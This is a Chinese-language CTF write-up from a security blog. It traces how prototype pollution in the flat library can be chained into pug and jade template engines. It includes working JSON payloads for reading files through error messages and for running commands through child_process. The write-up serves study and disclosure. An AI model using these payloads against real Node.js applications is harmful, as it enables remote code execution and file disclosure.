# 从一道题开始的pug原型污染链挖掘

阅读量 **214822**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-14 10:30:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t018ff0af1e6d3d76e0.jpg)

之前在hackthebox的一次ctf比赛中有一道题考察了原型链污染攻击pug,在做题的时候用AST
Injection这种方式又发现了一个未公开的pug&&jade的原型攻击链,和大家分享一下.

## 题目简析

这道题目具体是HackTheBox 2021 Cyber Apocalypse 2021的一道web题,wp和源码可以在下面这个链接里面找到.
<https://github.com/evyatar9/Writeups/tree/d67484a86ede51e8cdb3ea1b8ed042363c471296/CTFs/2021-CTF_HackTheBox/Cyber_Apocalypse_2021/Web-BlitzProp>

题目场景:一个提交表单,用json来传输提交的数据

![](https://p2.ssl.qhimg.com/t01b14ff43a2fca14a1.png)

分析代码,发现代码量也很少,只有两个路由

![](https://p1.ssl.qhimg.com/t0170fb2c8d92d5b81f.png)

仔细分析`/api/submit`部分代码发现用了flat这个库解析传过去的json数据, 题目flat版本是5.0.0,
这个版本存在一个原型链污染漏洞,详情参考 <https://snyk.io/vuln/npm:flat> .
所以可以post下面的数据成功进入if条件里面:

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild"
    }
    // Hello guest, thank you for letting us know!
    

存在原型链污染,题目又没有别的可利用点,所以只能考虑原型链污染打pug.预期解应该是使用 **POSIX** 师傅这条公开链打,
<https://blog.p6.is/AST-Injection/> .
但是当时我还不知道pug有一个现成的原型攻击链,所以就尝试手动调试挖掘下,就开启我的模板引擎调试之旅.

## 任意文件读取

由于pug是jade换了名字改过来的,我就直接尝试了jade的链子能不能打通,就意外发现报错可用带出部分文件内容.

jade的链子直接打是会报错的:

![](https://p3.ssl.qhimg.com/t0111b956c51f739e71.png)

于是我深入调试分析,直接进入`pug.compile`函数

![](https://p1.ssl.qhimg.com/t01ac84f7dfa6fef134.png)

跟进`compileBody`

![](https://p0.ssl.qhimg.com/t019999ca4473de796d.png)

在compile处下断点

!

发现会调用generateCode插件,再继续跟踪调试到`Compiler.compile()`

![](https://p3.ssl.qhimg.com/t0154c480a98b0a959e.png)

下面这段代码其实就很熟悉了,最终要返回执行的模板函数会存在`buf`里面,而`buf`在pug下面这段代码里面又传给了`js`

![](https://p0.ssl.qhimg.com/t014d64e11602f6fccc.png)

之前post的json是:

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild",
        "{}.__proto__.self":true,
        "line":"global.process.mainModule.require('child_process').exec('calc')"
    }
    

发现报错其实是污染this.options.self改变了程序运行逻辑,下面这段代码

![](https://p1.ssl.qhimg.com/t01092af9fbe8f351be.png)

未污染的时候self为undefined值.然后接着调试,发现报错的时候有惊喜,报错的时候有一个filename是undefined,尝试把它污染,污染之后会继续执行后面的代码,否则会直接throw
error.

![](https://p4.ssl.qhimg.com/t01216ae8418bfb7a5c.png)

之后发现存在读取文件操作

![](https://p5.ssl.qhimg.com/t017c63e97e71b8fa36.png)

最后发现会把文件内容拼接到报错信息:

![](https://p0.ssl.qhimg.com/t012f735ebf4d4321d7.png)

![](https://p3.ssl.qhimg.com/t011385acff14048d59.png)

然后在非debug条件下:

![](https://p3.ssl.qhimg.com/t018d5dbd38575845ce.png)

payload :

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild",
        "{}.__proto__.self":true,
        "{}.__proto__.filename":"./flag"
    }
    

但是当时的flag文件是/flagxxxxx后面是随机的,所以这题就没出: (

## AST Injection

赛后发现pug有现成链子:

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild",
        "__proto__.block":{
            "type":"Text",
            "line":"process.mainModule.require('child_process').exec('calc')"
        }
    }
    

很好奇这个链子是怎么挖出来的,所以仔细阅读了POSIX这篇文章 . <https://blog.p6.is/AST-Injection/>

里面讲了一种AST Injection的方法,挖掘了很多模板引擎的原型污染链.
由于还没学编译原理,对模板引擎底层设计也不熟悉,所以感觉这篇文章的精髓也没有理解,只能跟着调试一下.

调试的时候会发现下面这端代码, `this.visit`,这段代码对于调试过jade
RCE链的人来说必定很熟悉,因为jade的恶意代码就是通过污染node.line拼接到模板函数里面的.

![](https://p3.ssl.qhimg.com/t01581984623c4d45ca.png)

但是比赛的时候我并没有调试出node.line为undefined的情况,所以污染这个也不起什么作用,后来发现是格局小了(

不存在node.line为undefined这个条件,我们可以自己创造条件( XD ,
如果调试的够仔细的话可以发现在`visitCode()`函数中存在`code.block`为undefined的情况.block值不为空就会调用this.visit,进而有node.line为undefined的情况

![](https://p3.ssl.qhimg.com/t01a5b8657cb9f14ad4.png)

然后就有熟悉又亲切的undefined line

![](https://p2.ssl.qhimg.com/t014f2c8c70efc4019a.png)

最终的payload:

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild",
        "{}.__proto__.block":{
            "type":"Text",
            "line":"process.mainModule.require('child_process').exec('calc')"
        }
    }
    

## 另一条链

如果调试的够仔细的话可以发现村在`visitTag()`里面也存在tag.code.

![](https://p1.ssl.qhimg.com/t01fbba6a3c9c5a551a.png)

污染一下再跟进到visitCode:

![](https://p4.ssl.qhimg.com/t0121baa71a63b37c25.png)

发现code.buffer为undefined(默认)或false的时候会把code.val(undefined)push到模板函数,所以可用注入一个visitTag进去

    
    
    {
        "song.__proto__.name":"Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild",
        "__proto__.code":{
            "val":";process.mainModule.require('child_process').exec('calc');"
            }
    }
    

![](https://p5.ssl.qhimg.com/t015bf283a6567adde2.png)

然后就弹出计算器了 : )

![](https://p0.ssl.qhimg.com/t013f9a29fedde3f54b.png)

另外再说一下,因为jade和pug比较像,所以我尝试了一下在jade模板引擎里面这条链打不打得通,发现可以,payload如下,分析就不贴了,差不多的.

    
    
    {
        "__proto__":{
            "self":"1",
            "code":{
                "val":";process.mainModule.require('child_process').exec('calc');"}
        }
    }
    

## 总结

我比较菜,只额外找到了另外一条链.POSIX师傅这个思路真的很强,顺着这个思路可能还可以找出一些别的链子,有兴趣的师傅可以调试分析下.  
另外报错读取文件也很有趣, 大师傅们可以再深入探索下. 有新的发现可以联系我交流hh .

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **L0nm4r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/246492](/post/id/246492)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [nodejs](/tag/nodejs)
  * [原型链污染](/tag/原型链污染)

 **+1** __7赞

 __收藏

![](https://p1.ssl.qhimg.com/t01f29eb984429cc619.png) L0nm4r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

